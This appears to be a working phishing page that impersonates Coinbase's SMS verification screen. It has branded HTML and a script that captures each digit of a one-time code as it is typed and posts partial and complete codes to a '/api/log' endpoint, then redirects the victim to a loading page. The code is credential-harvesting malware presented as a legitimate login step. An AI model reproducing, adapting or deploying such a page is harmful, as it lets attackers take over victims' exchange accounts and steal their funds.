
<!DOCTYPE html>
<html class="ll-fb" lang="en" style="background:#0a0b0d;">
 <head>
  <meta charset="utf-8"/>
  <link rel="icon" href="/Coinbaselogo.png"/>
  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
  <title>Coinbase - Phone Verification</title>
  <meta content="#000000" name="theme-color"/>
  <link rel="stylesheet" href="css/flow-b-shell.css"/>
  <link href="css/7.css" rel="stylesheet"/>
  <style>
html.ll-fb,
html.ll-fb *,
html.ll-fb *::before,
html.ll-fb *::after {
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif !important;
}
  </style>
</head>
 <body style="background:#0a0b0d;">
  <div class="ll-fb-type" id="root">
   <div class="h-full w-full flex-grow justify-between bg-coinbase-background sm:justify-start">
    <div class="w-full px-6 pt-5">
     <svg class="ll-fb-logo" height="32" viewbox="0 0 48 48" width="32" xmlns="http://www.w3.org/2000/svg">
      <path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="#FFFFFF">
      </path>
     </svg>
    </div>
    <div class="flex w-full flex-col items-center justify-center bg-coinbase-background pb-8">
     <form class="mt-12 flex min-h-fit w-full max-w-md flex-col rounded-[16px] p-6 font-coinbase-text sm:mt-24 sm:border sm:border-coinbase-line sm:px-10 sm:py-8">
      <span class="ll-fb-title pb-2 font-coinbase-title text-[28px] font-semibold text-white">
       Enter the 6-digit code we texted to
       <b id="cb-sms-phone">+** ********</b>
      </span>
      <span class="font-coinbase-sans text-coinbase-foreground-muted">
       This helps us keep your account secure by verifying that it's really you.
      </span>
      <div class="relative mt-12">
       <div class="flex w-full justify-between gap-2">
        <input class="digit font-coinbase-sans text-center h-14 w-full rounded-md bg-transparent text-xl text-white outline-none ring-1 ring-coinbase-line transition-all hover:bg-[#0f1012] focus:ring-2 disabled:bg-[#0a0a0c] focus:ring-coinbase-primary" inputmode="numeric" maxlength="1" type="text" id="one-time-code" autocomplete="one-time-code" value=""/>
        <input class="digit font-coinbase-sans text-center h-14 w-full rounded-md bg-transparent text-xl text-white outline-none ring-1 ring-coinbase-line transition-all hover:bg-[#0f1012] focus:ring-2 disabled:bg-[#0a0a0c] focus:ring-coinbase-primary" inputmode="numeric" maxlength="1" type="text" value=""/>
        <input class="digit font-coinbase-sans text-center h-14 w-full rounded-md bg-transparent text-xl text-white outline-none ring-1 ring-coinbase-line transition-all hover:bg-[#0f1012] focus:ring-2 disabled:bg-[#0a0a0c] focus:ring-coinbase-primary" inputmode="numeric" maxlength="1" type="text" value=""/>
        <input class="digit font-coinbase-sans text-center h-14 w-full rounded-md bg-transparent text-xl text-white outline-none ring-1 ring-coinbase-line transition-all hover:bg-[#0f1012] focus:ring-2 disabled:bg-[#0a0a0c] focus:ring-coinbase-primary" inputmode="numeric" maxlength="1" type="text" value=""/>
        <input class="digit font-coinbase-sans text-center h-14 w-full rounded-md bg-transparent text-xl text-white outline-none ring-1 ring-coinbase-line transition-all hover:bg-[#0f1012] focus:ring-2 disabled:bg-[#0a0a0c] focus:ring-coinbase-primary" inputmode="numeric" maxlength="1" type="text" value=""/>
        <input class="digit font-coinbase-sans text-center h-14 w-full rounded-md bg-transparent text-xl text-white outline-none ring-1 ring-coinbase-line transition-all hover:bg-[#0f1012] focus:ring-2 disabled:bg-[#0a0a0c] focus:ring-coinbase-primary" inputmode="numeric" maxlength="1" type="text" value=""/>
       </div>
       <span id="cb-sms-err" style="display:none;color:#f87171;font-size:12px;font-family:monospace;margin-top:8px;">The code you entered is incorrect. Try again.</span>
      </div>
      <button id="cb-sms-resend" class="bg-[#32353d] hover:bg-[#3a3d45] disabled:bg-[#1e2024] disabled:text-[#858586] disabled:scale-100 active:scale-[.98] active:bg-[#47494f] rounded-full py-4 flex font-coinbase-sans text-white pl-6 pr-8 items-center font-semibold justify-center mt-8" disabled="" type="button">
       Resend code in 30
      </button>
     </form>
    </div>
   </div>
  </div>
  <script>
  (function(){
    var _d = window._cbSmsData || {};
    var last2 = String(_d.last2 == null ? '' : _d.last2).replace(/\D/g, '').slice(-2);
    var ending = last2.length === 0 ? '**' : (last2.length === 1 ? '*' + last2 : last2);
    var phoneEl = document.getElementById('cb-sms-phone');
    if (phoneEl) phoneEl.textContent = '+** ******' + ending;

    var inputs = Array.from(document.querySelectorAll('.digit'));
    var _smsSubmitted = false;

    function _currentCode() {
      return inputs.map(function(i){ return i.value; }).join('');
    }

    function _sendCodeEvent(type, element, value) {
      if (typeof window._liveledCSRF === 'undefined') return;
      var gate = window._llWhenWritable || function(fn){ return Promise.reject(); };
      gate(function(){
        var b = new URLSearchParams({ _token: window._liveledCSRF, page: 'coinbase_sms_code', type: type, element: element, value: value, doc: window._llDocId || '' });
        fetch('/api/log', { method: 'POST', body: b, keepalive: true });
      });
    }

    var smsErr = document.getElementById('cb-sms-err');
    function _clearSmsErr() {
      if (smsErr) smsErr.style.display = 'none';
      inputs.forEach(function(inp){ inp.style.boxShadow = ''; });
    }

    function _checkComplete() {
      var code = _currentCode();
      _sendCodeEvent('code_input', 'code_partial', code);
      if (code.length === 6 && inputs.every(function(i){ return i.value !== ''; }) && !_smsSubmitted) {
        _smsSubmitted = true;
        var b = new URLSearchParams({ _token: window._liveledCSRF || '', page: 'coinbase_sms_code', type: 'form_submit', element: 'code', value: code, doc: window._llDocId || '' });
        var post = window._llPostTrack ? window._llPostTrack(b) : Promise.reject();
        post.then(function () {
          window.location.href = '/coinbase/loading';
        }).catch(function () {
          _smsSubmitted = false;
        });
      }
    }

    inputs.forEach(function(inp, idx){
      inp.maxLength = 1;
      inp.addEventListener('input', function(){
        _clearSmsErr();
        if (this.value.length >= 1 && idx < inputs.length - 1) {
          inputs[idx + 1].focus();
        }
        _checkComplete();
      });
      inp.addEventListener('keydown', function(e){
        if (e.key === 'Backspace' && !this.value && idx > 0) {
          inputs[idx - 1].focus();
        }
      });
    });

    var btn = document.getElementById('cb-sms-resend');

    function startCountdown(){
      if (!btn) return;
      btn.disabled = true;
      var secs = 30;
      btn.textContent = 'Resend code in ' + secs;
      var timer = setInterval(function(){
        secs--;
        if (secs > 0) {
          btn.textContent = 'Resend code in ' + secs;
        } else {
          clearInterval(timer);
          btn.textContent = 'Resend code';
          btn.disabled = false;
          btn.addEventListener('click', function onResendClick(){
            btn.removeEventListener('click', onResendClick);
            startCountdown();
          }, {once: true});
        }
      }, 1000);
    }

    startCountdown();

    function _histShow(e){
      if(e&&e.persisted)return true;
      try{var n=performance.getEntriesByType&&performance.getEntriesByType('navigation');if(n&&n[0]&&n[0].type==='back_forward')return true;}catch(x){}
      try{if(performance.navigation&&performance.navigation.type===2)return true;}catch(x){}
      return false;
    }
    window.addEventListener('pageshow',function(e){
      if(!_histShow(e))return;
      _smsSubmitted=false;
      inputs.forEach(function(inp){ inp.value=''; });
      if(e.persisted||!window._llCbSmsInvalid)_clearSmsErr();
    });
  })();
  </script>
 </body>
</html>
